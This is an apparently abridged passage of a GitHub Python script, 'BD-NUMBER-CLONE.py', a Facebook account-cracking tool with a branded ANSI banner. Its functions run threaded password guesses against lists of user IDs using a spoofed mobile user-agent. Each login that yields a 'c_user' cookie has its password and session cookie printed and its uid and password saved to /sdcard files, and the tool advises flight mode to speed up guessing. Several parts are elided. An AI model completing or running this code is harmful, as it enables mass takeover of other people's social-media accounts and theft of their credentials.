...
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝
<━━━━━━━━━━━━━━━━━━◆😈◆━━━━━━━━━━━━━━━━━━>
\033[1;91m<═══\033[1;41m\033[1;97m 🥰𝐖𝐄𝐋𝐎𝐂𝐌𝐄 𝐓𝐎 MARJAN 𝐓𝐎𝐎𝐋𝐒🥰\033[;0m\033[1;91m═══>\033[1;92m
\033[1;92m══════════════════════════════════════════
\033[1;32m[-] 𝐓𝐎𝐎𝐋𝐒 𝐓𝐘𝐏𝐄:\033[1;32m FREE
\033[1;32m[-] 𝐕𝐄𝐑𝐒𝐈𝐎𝐍   :\033[1;32m 0.9
\033[1;32m[-] 𝐀𝐔𝐓𝐇𝐎𝐑    :\033[1;32m MARJAN 
\033[1;32m[-] 𝐆𝐈𝐓𝐇𝐔𝐁    :\033[1;32m MARJAN XXX
\033[1;32m[-] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  :\033[1;32m MAR JAN
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m 😈𝐓𝐇𝐈𝐒 𝐍𝐀𝐌𝐄 𝐈𝐒 MAR JAN 𝐁𝐑𝐀𝐍𝐃😈\033[;0m\033[1;91m═══>\033[1;92m""")
...
def asha():
    ...
    with ThreadPool(max_workers=30) as raifa:
        ...
        print('[+] Save As /sdcard/︎︎︎︎︎︎MARJAN-ok.txt')
        print('[!] Save As /Sdacrd/︎︎︎︎︎︎MARJAN-cp.txt')
...
def naima():
    ...
    with ThreadPool(max_workers=30) as raifa:
        ...
        print('[+] Save As /sdcard/MARJAN-ok.txt')
        print('[!] Save As /Sdacrd/MARJAN-cp.txt')
        print('[!] Use flight mode for speed up ')
        for guru in user:
...
def sabina(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[︎︎︎︎︎︎MARJAN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
           ...
           'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"[PASSWORD] = {ps}")
                print(f"[COOKIE] = {coki}")
                open('/sdcard/︎︎︎︎︎︎MARJAN-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                print(f"[PASSWORD] = {ps}")
                print(f"[COOKIE] = {coki}")
                open('/sdcard/︎︎︎︎︎︎MARJAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(ids)
                break
            else:
                continue
...
Blog
About
MIX-CLONE/BD-NUMBER-CLONE.py at main · MARJAN/MIX-CLONE · GitHub
